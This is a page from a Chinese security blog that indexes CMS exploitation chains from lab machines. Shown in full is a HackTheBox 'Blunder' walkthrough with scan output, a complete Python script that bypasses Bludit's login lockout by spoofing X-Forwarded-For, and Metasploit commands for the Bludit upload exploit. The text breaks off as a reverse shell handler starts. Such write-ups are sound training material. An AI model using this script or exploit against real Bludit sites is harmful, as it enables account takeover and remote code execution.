---
title: CMS 管理功能与历史执行链
url: https://lucifer11.xyz/knowledge/cms-misc/
source: 0xfd's blog
date: 2026-11-25
fetch_date: 2026-11-26T10:13:44.980513
---

# CMS 管理功能与历史执行链

![0xfd's blog](/images/fifteen-katana-zero-katana-zero.gif)
[0xfd's blog](/)

by 0xfd

* [首页](/)
* [知识库](/knowledge/)
* [导读](/guide/)
* [分类](/categories/)
* [标签](/tags/)
* [归档](/archives/)
* [关于](/about/)
* 搜索

* 文章目录
* 站点概览

1. [分析重点](#%E5%88%86%E6%9E%90%E9%87%8D%E7%82%B9)
2. [案例与技术索引](#%E6%A1%88%E4%BE%8B%E4%B8%8E%E6%8A%80%E6%9C%AF%E7%B4%A2%E5%BC%95)
3. [CMS 上传路径与 sudo 身份解析](#CMS-%E4%B8%8A%E4%BC%A0%E8%B7%AF%E5%BE%84%E4%B8%8E-sudo-%E8%BA%AB%E4%BB%BD%E8%A7%A3%E6%9E%90)
4. [邮件线索与 Moodle 命令执行](#%E9%82%AE%E4%BB%B6%E7%BA%BF%E7%B4%A2%E4%B8%8E-Moodle-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)
5. [Strapi 认证重置与内部 Laravel](#Strapi-%E8%AE%A4%E8%AF%81%E9%87%8D%E7%BD%AE%E4%B8%8E%E5%86%85%E9%83%A8-Laravel)
6. [后台上传与文件能力排查](#%E5%90%8E%E5%8F%B0%E4%B8%8A%E4%BC%A0%E4%B8%8E%E6%96%87%E4%BB%B6%E8%83%BD%E5%8A%9B%E6%8E%92%E6%9F%A5)
7. [CMS 执行与多份数据库配置](#CMS-%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%A4%9A%E4%BB%BD%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE)

![253](/images/fifteen-katana-zero-katana-zero.gif)

253

漏洞分析、利用机制、二进制研究与安全工程

[83
日志](/archives/)

[65
分类](/categories/)

[312
标签](/tags/)

GitHub

E-Mail

Twitter

FB Page

YouTube

Instagram

infosec.exchange

![Creative Commons](https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg)

0%

链接

* atsud0
* 记忆里的纯真
* 小离

# CMS 管理功能与历史执行链

发表于
2026-11-25

分类于

[Web安全](/categories/Web%E5%AE%89%E5%85%A8/)
，
[CMS与插件](/categories/Web%E5%AE%89%E5%85%A8/CMS%E4%B8%8E%E6%8F%92%E4%BB%B6/)

阅读次数：

本文字数：
12k

阅读时长 ≈
43 分钟

管理后台中的上传、模板、命令配置和凭据重置可能连接到系统执行。本章保留多个 CMS 的原环境和完整分支，对照后台身份、版本、可写路径与后续本地权限。

管理后台中的上传、模板、命令配置和凭据重置可能连接到系统执行。本章保留多个 CMS 的原环境和完整分支，对照后台身份、版本、可写路径与后续本地权限。

[知识库目录](/knowledge/)
[研究导读](/guide/)
[下载 Markdown](/knowledge/cms-misc/source.md)
展开全部技术记录

## 分析重点

Blunder、GoldenEye 分别记录 Bludit 和 Moodle 的既有执行路线。

Horizontall 从 Strapi 接到内部 Laravel，网络可达性属于链的一部分。

Os-hackNos-3 与 pWnOS2 保留凭据失效、配置差异和失败尝试。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [CMS 上传路径与 sudo 身份解析](#case-blunder) | blunder | Bludit、文件上传、sudo |
| [邮件线索与 Moodle 命令执行](#case-goldeneye-1) | GoldenEye-1 | Moodle、邮件、OverlayFS |
| [Strapi 认证重置与内部 Laravel](#case-horizontall) | horizontall | Strapi、Laravel、CVE-2021-3129 |
| [后台上传与文件能力排查](#case-os-hacknos-3) | Os-hackNos-3 | osTicket、文件上传、Capabilities |
| [CMS 执行与多份数据库配置](#case-pwnos2-0-pre-release) | pWnOS2-0-Pre-Release | CMS、配置泄露、MySQL |

## CMS 上传路径与 sudo 身份解析

从页面词汇生成字典，到 Bludit 的上传路径穿越，再通过配置中的凭据切换用户。sudo 的负数用户标识分支与原版本条件一起保留。

来源 blunder · 原记录 2020-06-05 · 16 个代码块 · 5 处图片引用

查看分析过程、攻击步骤与完整代码

#### introduce

OS: Linux
Difficulty: Easy
Points: 20
Release: 30 May 2020
IP: 10.10.10.191

User Blood: 00 days, 03 hours, 27 mins, 50 seconds.
Root Blood: 00 days, 03 hours, 31 mins, 10 seconds.

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb38.jpg)
* ![my htb rank](http://www.hackthebox.eu/badge/image/235857)

#### information gathering

first use nmap as usaul

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 ``` | ``` root@kali:~/hackthebox/blunder# nmap -sV -sC -Pn -T4 -v -p- --min-rate=10000 10.10.10.191 PORT   STATE  SERVICE VERSION 21/tcp closed ftp 80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: A0F0E5D852F0E3783AF700B6EE9D00DA |_http-generator: Blunder | http-methods:  |_  Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Blunder | A blunder of interesting facts ``` |

then dirsearch

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 ``` | ``` root@kali:~/dirsearch# python3 dirsearch.py -u http://10.10.10.191 -e *  [19:41:36] 301 -    0B  - /admin  ->  http://10.10.10.191/admin/        [19:41:41] 200 -    2KB - /admin/.config                [19:41:41] 200 -    2KB - /admin/.htaccess [19:41:41] 200 -    2KB - /admin/ [19:43:20] 301 -    0B  - /domcfg.nsf/?open  ->  http://10.10.10.191/domcfg.nsf [19:44:01] 200 -   30B  - /install.php                                                       [19:44:10] 200 -    1KB - /LICENSE                                                       [19:45:07] 200 -    3KB - /README.md                                                            [19:45:10] 200 -   22B  - /robots.txt                 [19:45:16] 403 -  277B  - /server-status/                                               [19:45:17] 403 -  277B  - /server-status ``` |

wfuzz the url,to find the hidden txt file

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 ``` | ``` wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404,403 -u "http://10.10.10.191/FUZZ.txt" -t 100  =================================================================== ID           Response   Lines    Word     Chars       Payload                              ===================================================================  000003513:   200        1 L      4 W      22 Ch       "robots"                             000004119:   200        4 L      23 W     118 Ch      "todo" ``` |

todo.txt

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` -Update the CMS -Turn off FTP - DONE -Remove old users - DONE -Inform fergus that the new blog needs images - PENDING ``` |

#### getshell

use cewl to generate wordlist

|  |  |
| --- | --- |
| ``` 1 ``` | ``` cewl -w wordlists.txt -d 10 -m 1 http://10.10.10.191/ ``` |

write a python script to bruteforce the password

the origin source code can be found at the following link

* Bludit Brute Force Mitigation Bypass

brute.py

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 ``` | ``` import re import requests #from __future__ import print_function  def open_ressources(file_path):     return [item.replace("\n", "") for item in open(file_path).readlines()]  host = 'http://10.10.10.191' login_url = host + '/admin/login' username = 'fergus' wordlist = open_ressources('/root/hackthebox/blunder/wordlists.txt')  for password in wordlist:     session = requests.Session()     login_page = session.get(login_url)     csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)      print('[*] Trying: {p}'.format(p = password))      headers = {         'X-Forwarded-For': password,         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',         'Referer': login_url     }      data = {         'tokenCSRF': csrf_token,         'username': username,         'password': password,         'save': ''     }      login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)      if 'location' in login_result.headers:         if '/admin/dashboard' in login_result.headers['location']:             print()             print('SUCCESS: Password found!')             print('Use {u}:{p} to login.'.format(u = username, p = password))             print()             break ``` |

got the result

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` SUCCESS: Password found! Use fergus:RolandDeschain to login. ``` |

now we can access the backend system

it use open source Bludit CMS, let’s google the exploit

right click and see the source code, found the version number 3.9.2

reference to

* CVE-2019-16113
* Bludit - Directory Traversal Image File Upload - Metasploit

we use msf to get a shell

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ``` | ``` msf5 > use exploit/linux/http/bludit_upload_images_exec msf5 exploit(linux/http/bludit_upload_images_exec) > set TARGET 0 msf5 exploit(linux/http/bludit_upload_images_exec) > set RHOST 10.10.10.191 msf5 exploit(linux/http/bludit_upload_images_exec) > set RPORT 80 msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITUSER fergus BLUDITUSER => fergus msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITPASS RolandDeschain BLUDITPASS => RolandDeschain msf5 exploit(linux/http/bludit_upload_images_exec) > exploit  [*] Started reverse TCP handl...